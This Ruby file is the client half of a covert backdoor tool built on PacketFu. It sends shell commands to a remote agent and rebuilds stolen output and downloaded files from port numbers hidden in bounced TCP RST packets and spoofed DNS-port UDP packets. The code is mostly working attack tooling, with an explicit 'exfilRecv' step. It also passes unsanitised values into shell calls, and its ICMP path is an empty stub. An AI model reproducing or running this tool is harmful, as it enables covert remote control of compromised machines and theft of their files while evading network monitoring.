require 'packetfu'

require File.expand_path(File.join(File.dirname(__FILE__), 'cipher.rb'))
require File.expand_path(File.join(File.dirname(__FILE__), 'packetizer.rb'))

include PacketFu

class Client
  def initialize(iface, tos, addr, pass, port = nil)
    @conn = Connector.new(iface, tos, addr, pass, "client", port)
    @tos = tos
    @conn.sendAddr
  end

  def start
    puts "write a command or prepend 'dl ' to your command to get a file"
    while (true)

      str = STDIN.gets
      if str[0,3] == "dl "
        @conn.cliSend("cat " + str[3..-1])
        array = str[3..-1].split("/")
        fn = array[array.length - 1]
        system("rm -f #{fn}")
        readPackets(fn)
      else
        @conn.cliSend(str)
        readPackets()
      end
      STDIN.flush
    end
  end

private

  def readPackets(dl = nil)
    while(true)
      case @tos
        when "icmp"
          icmp(dl)
        when "tcp"
          tcp(dl)
        when "udp"
          udp(dl)
        else
          abort("Client::readPackets @tos not initialized")
      end
    end
  end

  def tcp(dl = nil)
    filter = "tcp and tcp[13] & 4!=0 and src #{$tcpBounceIp}"
    str = ""
    i = 0
    cap = Capture.new(:iface => $iface, :start => true, :promisc => true, :filter => filter)

    cap.stream.each do |p|
      pkt = Packet.parse p
      if pkt.is_tcp?
        puts "packet Recieved"
        if (pkt.tcp_dst == 57359)
          puts "final packet"
          result = @conn.exfilRecv(str)
          if (dl.nil?)
            print result
            STDOUT.flush
          else
            system("echo -ne #{result} > #{dl}")
          end
          return
        end
        char = (pkt.tcp_dst >> 8).chr
        str += " "
        str[i] = char
        i += 1
      end
    end
  end

  def udp(dl = nil)
    filter = "udp and port 53 and src #{$tcpBounceIp}"
    result = ""
    i = 0
    cap = Capture.new(:iface => $iface, :start => true, :promisc => true, :filter => filter)
    cap.stream.each do |p|
    pkt = Packet.parse p
      if pkt.is_udp? && pkt.udp_src >= 12000 && pkt.udp_src <= 12033
        puts "packet Recieved"
        if (pkt.udp_src == 12033)
          puts "final packet"
          result += @conn.exfilRecv(pkt.payload)
          if (dl.nil?)
            print result
            STDOUT.flush
          else
            system("echo -ne #{result} > #{dl}")
          end
          return
        end
        result += @conn.exfilRecv(pkt.payload)
      end
    end
  end

  def icmp
  end

end
